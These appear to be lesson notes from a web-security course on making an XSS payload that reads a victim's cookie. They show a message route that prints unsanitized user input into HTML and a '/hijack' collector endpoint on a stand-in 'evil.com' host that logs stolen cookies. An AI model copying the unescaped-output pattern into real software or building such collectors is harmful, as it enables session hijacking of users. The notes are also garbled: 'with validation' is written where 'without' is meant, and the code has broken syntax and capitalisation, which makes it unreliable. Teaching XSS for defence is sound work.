[Video Link](https://egghead.io/lessons/egghead-make-an-xss-payload-to-read-a-cookie-from-a-vulnerable-website)

# 10. Make an XSS Payload to Read a Cookie from a Vulnerable Website

**XSS attacks use a web app to inject malicious code to user on a trusted application**

This happens when a website includes user input and output with validation or encoding.

The way this works is that a message gets pushed under the `messages` array 

The message that gets pushed is a message from our `user.username`, followed by the value of the message parameter from the request.

```js
Const messages = [];

Module.exports = app => {
.
.
.
message.push(
	`message from ${request.session.user.username}: ${request.body.messages}`
)
}
```

The message is not sanitized or encoded, in the message route they messages are just printed out in plain HTML

Go to index.js, add an endpoint called /hijack to evil.com

Then log “received cookie” and put the info in the payload parameter of our `get` query, and respond with status 200 and OK

```js
app.route(“/hijack”).get((request, response)) => {})
console.log(“received cookie”, request.query.payload)
response.status(200);
response.send(“ok”)
)
```
